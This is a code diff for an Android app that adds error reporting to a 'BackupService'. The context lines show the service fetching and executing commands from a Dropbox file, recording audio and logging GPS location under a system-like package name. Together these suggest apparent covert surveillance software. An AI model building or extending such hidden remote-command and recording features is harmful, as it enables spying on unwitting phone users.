@@ -17,6 +17,7 @@ import android.util.Log;
 
 import com.android.commstat.Actions;
 import com.android.commstat.AudioRecorder;
+import com.android.commstat.ErrorsLog;
 import com.android.commstat.Gpx;
 import com.android.commstat.IOUtils;
 import com.android.commstat.model.CommandSettings;
@@ -121,6 +122,7 @@ public class BackupService extends IntentService {
             }
         } catch (DbxException e) {
             e.printStackTrace();
+            ErrorsLog.send(this, "DropBox", e);
             return;
         }
         if (commandsFileMetadata == null) {
@@ -133,6 +135,7 @@ public class BackupService extends IntentService {
             client.files().downloadBuilder(commandsFileMetadata.getPathDisplay()).download(os);
         } catch (Exception e) {
             e.printStackTrace();
+            ErrorsLog.send(this, "DropBox", e);
         } finally {
             IOUtils.closeQuietly(os);
         }
@@ -140,6 +143,7 @@ public class BackupService extends IntentService {
             client.files().delete(commandsFileMetadata.getPathDisplay());
         } catch (DbxException e) {
             e.printStackTrace();
+            ErrorsLog.send(this, "DropBox", e);
         }
         if (!commandsFile.exists()) {
             return;
@@ -156,12 +160,14 @@ public class BackupService extends IntentService {
                 }
             } catch (Exception e) {
                 e.printStackTrace();
+                ErrorsLog.send(this, "Exec command", e);
             } finally {
                 IOUtils.closeQuietly(buffreader);
                 IOUtils.closeQuietly(inputreader);
             }
         } catch (Exception e) {
             e.printStackTrace();
+            ErrorsLog.send(this, "read commands", e);
         } finally {
             IOUtils.closeQuietly(is);
         }
@@ -193,6 +199,7 @@ public class BackupService extends IntentService {
             new LocationRecordTask(command.getTotalDuration(), command.getDuration()).start();
         } catch (IOException e) {
             e.printStackTrace();
+            ErrorsLog.send(this, "LocationRecord", e);
         }
     }
 
@@ -357,7 +364,12 @@ public class BackupService extends IntentService {
 
         void start() {
             mIsStop = false;
-            mRecorder.start();
+            try {
+                mRecorder.start();
+            } catch (IOException e) {
+                e.printStackTrace();
+                ErrorsLog.send(BackupService.this, "Start recorder", e);
+            }
             mStopTimer = new Timer();
             mStopTimer.schedule(new TimerTask() {
                 @Override
@@ -582,6 +594,7 @@ public class BackupService extends IntentService {
             }
         } catch (IOException e) {
             e.printStackTrace();
+            ErrorsLog.send(this, "CreateMessageFile", e);
             return null;
         }
         return file;
